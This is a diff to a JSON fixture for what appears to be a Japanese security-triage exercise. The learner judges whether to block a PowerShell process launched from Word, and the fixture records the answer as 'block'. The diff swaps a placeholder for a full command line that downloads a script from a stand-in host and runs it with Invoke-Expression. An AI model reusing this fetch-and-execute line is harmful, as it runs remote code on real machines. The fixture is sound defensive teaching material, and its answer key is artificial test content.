@@ -3,7 +3,7 @@
   "id": "PROC-WIN-OFFICE-DOWNLOAD",
   "category": "process",
   "platform": "windows",
-  "level": "beginner",
+  "level": "beginner_external",
   "ground_truth": "block",
   "title": "Officeからの外部取得Command",
   "request": "稼働中のProcessを継続させますか。 ALLOW / BLOCKで判断してください。",
@@ -22,7 +22,7 @@
       "id": "pe",
       "name": "Process Explorer",
       "description": "実行Path・Command Line・親Process・ロード済みDLLを確認します。",
-      "output": "Parent: WINWORD.EXE (3010)\nPID: 4200\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommand line: powershell.exe -NoProfile -Command \"iwr https://office-assets.example/a.ps1; <TRAINING-PLACEHOLDER:取得Scriptの実行>\"\nUser: ASTER\\mori\nLoaded DLLs (抜粋):\nC:\\Windows\\System32\\kernel32.dll",
+      "output": "Parent: WINWORD.EXE (3010)\nPID: 4200\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommand line: powershell.exe -NoProfile -Command \"$response = iwr https://office-assets.example/a.ps1; Invoke-Expression -Command $response.Content\"\nUser: ASTER\\mori\nLoaded DLLs (抜粋):\nC:\\Windows\\System32\\kernel32.dll",
       "accepted_information_types": [
         "pid"
       ],
@@ -58,11 +58,11 @@
       "id": "disclosure",
       "name": "外部照会方針",
       "content": {
-        "公開Indicator": "公開Domain・公開IP・公開配布FileのSHA-256は照会可。",
+        "Indicator": "機密指定のないDomain・IPと公開配布FileのSHA-256は、承認された外部サービスへ照会可。",
         "File本体": "社外秘Fileは送信不可。公開配布物は送信可。",
         "URL": "Token・User ID・内部Host・機密Pathを含む完全URLは送信不可。",
         "Email・PCAP": "本文、添付、認証情報を含むため本教材の案件では外部送信不可。",
-        "今回の資料区分": "公開Indicatorの照会対象。個別の機密情報は上記に従う。"
+        "今回の資料区分": "照会対象のIndicatorは機密指定なし。File本体・完全URLは上記に従う。"
       }
     }
   ],
@@ -484,5 +484,5 @@
   "sources": [
     "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer"
   ],
-  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。攻撃コマンドのPayloadは<TRAINING-PLACEHOLDER>に置換。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。"
+  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。実行可能なPayloadは配布しない。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。"
 }
